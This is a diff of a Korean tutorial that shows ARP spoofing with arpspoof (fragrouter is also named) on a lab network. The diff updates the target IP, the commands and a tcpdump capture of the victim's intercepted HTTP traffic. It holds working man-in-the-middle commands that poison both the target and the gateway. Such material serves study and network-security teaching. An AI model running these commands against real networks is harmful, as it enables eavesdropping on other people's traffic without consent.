@@ -114,23 +114,23 @@ sudo fragrouter -B1  # 가장 기본적인 모드
 ## 4. 테스트 예제: arpspoof 및 fragrouter 사용
 
 ### 가정된 네트워크 설정
-- **호스트 머신 (타겟)**: 198.19.249.22
+- **호스트 머신 (타겟)**: 198.19.249.2
 - **스푸핑 머신 (공격자)**: 198.19.249.3
 - **게이트웨이**: 198.19.249.1
 
 ### arpspoof 사용 예제
 호스트 머신의 트래픽을 가로채기 위해, 스푸핑 머신에서 다음 명령어를 실행   
-198.19.249.22(타겟)에게 게이트웨이 198.19.249.1의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄
+198.19.249.2(타겟)에게 게이트웨이 198.19.249.1의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄
 
 ```bash
-sudo arpspoof -i eth0 -t 198.19.249.22 198.19.249.1
+sudo arpspoof -i eth0 -t 198.19.249.2 198.19.249.1
 ```
 
 동시에, 스푸핑 머신에서 게이트웨이에도 ARP 스푸핑을 수행  
-게이트웨이 198.19.249.1에게 호스트 머신 198.19.249.22의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄
+게이트웨이 198.19.249.1에게 호스트 머신 198.19.249.2의 MAC 주소를 공격자의 MAC 주소로 속이는 ARP 패킷을 보냄
 
 ```bash
-sudo arpspoof -i eth0 -t 198.19.249.1 198.19.249.22
+sudo arpspoof -i eth0 -t 198.19.249.1 198.19.249.2
 ```
 
 
@@ -177,16 +177,10 @@ $ sudo tcpdump -D
 1.eth0 [Up, Running, Connected]
 2.any (Pseudo-device that captures on all interfaces) [Up, Running]
 3.lo [Up, Running, Loopback]
-4.docker0 [Up, Disconnected]
-5.tunl0 [none]
-6.bluetooth-monitor (Bluetooth Linux Monitor) [Wireless]
-7.nflog (Linux netfilter log (NFLOG) interface) [none]
-8.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]
-9.dbus-system (D-Bus system bus) [none]
-10.dbus-session (D-Bus session bus) [none]
+...
 
 # 패킷 캡쳐 : host httpbin.org and tcp port 80
-$ sudo tcpdump -i 1 host httpbin.org and tcp port 80
+$ sudo tcpdump -i 1 -n host httpbin.org and tcp port 80
 ```
 
 #### 호스트 머신 (타겟)에서 HTTP 호출 
@@ -198,42 +192,40 @@ $ curl httpbin.org/get
   "headers": {
     "Accept": "*/*",
     "Host": "httpbin.org",
-    "User-Agent": "curl/8.7.1",
-    "X-Amzn-Trace-Id": "Root=1-667d0f03-6c45dccc6751d62304eb2488"
+    "User-Agent": "curl/8.8.0",
+    "X-Amzn-Trace-Id": "Root=1-667d27b9-1bc9fbf01717e5424f5d3ec1"
   },
-  "origin": "49.236.95.152",
+  "origin": "124.49.100.52",
   "url": "http://httpbin.org/get"
 }
 ```
 
 #### 스푸핑 머신 (공격자) 에서 내용 확인 
 ```bash
-$ sudo tcpdump -i 1 host httpbin.org and tcp port 80
+$ sudo tcpdump -i 1 -n host httpbin.org and tcp port 80
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
-16:04:35.091993 IP 198.19.249.22.54156 > ec2-44-195-190-188.compute-1.amazonaws.com.http: Flags [S], seq 1223760141, win 64240, options [mss 1460,sackOK,TS val 1641688565 ecr 0,nop,wscale 7], length 0
-16:04:35.307704 IP ec2-44-195-190-188.compute-1.amazonaws.com.http > 198.19.249.22.54156: Flags [S.], seq 2645003696, ack 1223760142, win 65408, options [mss 65479,nop,nop,TS val 3887124623 ecr 1641688565,nop,wscale 7], length 0
-16:04:35.307737 IP 198.19.249.22.54156 > ec2-44-195-190-188.compute-1.amazonaws.com.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 1641688781 ecr 3887124623], length 0
-16:04:35.307816 IP 198.19.249.22.54156 > ec2-44-195-190-188.compute-1.amazonaws.com.http: Flags [P.], seq 1:78, ack 1, win 502, options [nop,nop,TS val 1641688781 ecr 3887124623], length 77: HTTP: GET /get HTTP/1.1
-16:04:35.307916 IP ec2-44-195-190-188.compute-1.amazonaws.com.http > 198.19.249.22.54156: Flags [.], ack 78, win 510, options [nop,nop,TS val 3887124624 ecr 1641688781], length 0
-16:04:35.551580 IP ec2-44-195-190-188.compute-1.amazonaws.com.http > 198.19.249.22.54156: Flags [P.], seq 1:484, ack 78, win 4096, options [nop,nop,TS val 3887124867 ecr 1641688781], length 483: HTTP: HTTP/1.1 200 OK
-16:04:35.551669 IP 198.19.249.22.54156 > ec2-44-195-190-188.compute-1.amazonaws.com.http: Flags [.], ack 484, win 499, options [nop,nop,TS val 1641689025 ecr 3887124867], length 0
-16:04:35.552204 IP 198.19.249.22.54156 > ec2-44-195-190-188.compute-1.amazonaws.com.http: Flags [F.], seq 78, ack 484, win 501, options [nop,nop,TS val 1641689025 ecr 3887124867], length 0
-16:04:35.552711 IP ec2-44-195-190-188.compute-1.amazonaws.com.http > 198.19.249.22.54156: Flags [.], ack 79, win 4095, options [nop,nop,TS val 3887124868 ecr 1641689025], length 0
-16:04:35.761178 IP ec2-44-195-190-188.compute-1.amazonaws.com.http > 198.19.249.22.54156: Flags [F.], seq 484, ack 79, win 4096, options [nop,nop,TS val 3887125077 ecr 1641689025], length 0
-16:04:35.761285 IP 198.19.249.22.54156 > ec2-44-195-190-188.compute-1.amazonaws.com.http: Flags [.], ack 485, win 501, options [nop,nop,TS val 1641689234 ecr 3887125077], length 0
-16:04:35.761181 IP ec2-44-195-190-188.compute-1.amazonaws.com.http > 198.19.249.22.54156: Flags [R.], seq 485, ack 79, win 0, options [nop,nop,TS val 3887125077 ecr 1641689025], length 0
-16:04:35.761668 IP ec2-44-195-190-188.compute-1.amazonaws.com.http > 198.19.249.22.54156: Flags [R], seq 2645004181, win 0, length 0
+08:55:23.564492 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [S], seq 3936188444, win 64240, options [mss 1460,sackOK,TS val 1312186693 ecr 0,nop,wscale 7], length 0
+08:55:23.564601 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [S], seq 3936188444, win 64240, options [mss 1460,sackOK,TS val 1312186693 ecr 0,nop,wscale 7], length 0
+08:55:23.822969 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 3173450946, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 0
+08:55:23.823057 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 1, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 0
+08:55:23.823188 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [P.], seq 0:77, ack 1, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 77: HTTP: GET /get HTTP/1.1
+08:55:23.823199 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [P.], seq 0:77, ack 1, win 502, options [nop,nop,TS val 1312186951 ecr 2806340177], length 77: HTTP: GET /get HTTP/1.1
+08:55:24.027301 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 484, win 499, options [nop,nop,TS val 1312187155 ecr 2806340382], length 0
+08:55:24.027380 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 484, win 499, options [nop,nop,TS val 1312187155 ecr 2806340382], length 0
+08:55:24.027960 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [F.], seq 77, ack 484, win 501, options [nop,nop,TS val 1312187156 ecr 2806340382], length 0
+08:55:24.027978 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [F.], seq 77, ack 484, win 501, options [nop,nop,TS val 1312187156 ecr 2806340382], length 0
+08:55:24.240286 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 485, win 501, options [nop,nop,TS val 1312187369 ecr 2806340595], length 0
+08:55:24.240313 IP 198.19.249.2.46206 > 44.206.219.79.80: Flags [.], ack 485, win 501, options [nop,nop,TS val 1312187369 ecr 2806340595], length 0
 ```
 
 #### capture.pcap 파일로 저장 후, Wireshark 툴로 확인
 
 ```bash
-$ sudo tcpdump -i 1 host httpbin.org and tcp port 80 -w capture.pcap
+$ sudo tcpdump -i 1 -n host httpbin.org and tcp port 80 -w capture.pcap
 ```
 
-![](/images/2024-06-27-16-20-36.png)
-
+![](/images/2024-06-27-18-08-23.png)
 
 {% endraw %}
  
